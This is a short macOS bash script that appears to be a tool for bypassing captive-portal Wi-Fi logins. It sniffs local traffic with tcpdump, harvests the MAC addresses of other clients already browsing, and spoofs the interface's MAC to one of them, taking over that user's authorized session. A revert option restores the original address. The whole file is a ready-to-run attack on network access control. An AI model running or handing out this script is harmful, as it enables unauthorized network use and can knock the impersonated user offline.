#!/bin/bash
INTERFACE='en0'
OWN_MAC=$(ifconfig $INTERFACE | grep ether | awk '{print $2}')
TCP_FILTER='not (dst net (10 or 172.16/12 or 192.168/16))'
TCP_DUMP='/tmp/captive-portal-bypass.dump'
TCP_DUMP_FILTERED='/tmp/captive-portal-bypass-filtered.dump'
MAC_ADDRESSES='/tmp/captive-portal-bypass-macs.txt'

if [ "$1" == "revert" ]; then
  echo "Reverting MAC of $INTERFACE to original MAC address"
  sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z
  ORIGINAL_MAC=$(networksetup -getmacaddress $INTERFACE | awk '{print $3}')
  sudo ifconfig $INTERFACE ether $ORIGINAL_MAC 2> /dev/null
  exit 0
fi

# Collect data
echo "Collecting network data"
sudo tcpdump -ne -c 100 $TCP_FILTER | egrep '(80|443)' | awk '{print $2}' > $TCP_DUMP

# Finter out duplicates
awk '!a[$0]++' $TCP_DUMP > $TCP_DUMP_FILTERED
grep -i '[0-9A-F]\{2\}\(:[0-9A-F]\{2\}\)\{5\}' $TCP_DUMP_FILTERED > $MAC_ADDRESSES

# Chnage MAC
while read MAC; do
  if [ "$MAC" != "$OWN_MAC" ]; then
    echo "Using MAC address: $MAC"
    sed -i "/$MAC/d" $MAC_ADDRESSES
    echo "Shutting down $INTERFACE"
    sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z
    sudo ifconfig $INTERFACE ether $MAC 2> /dev/null
    echo "MAC address is now set to $MAC"
    echo "Now reconnect to the captive portal network"
    break
  fi
done <$MAC_ADDRESSES
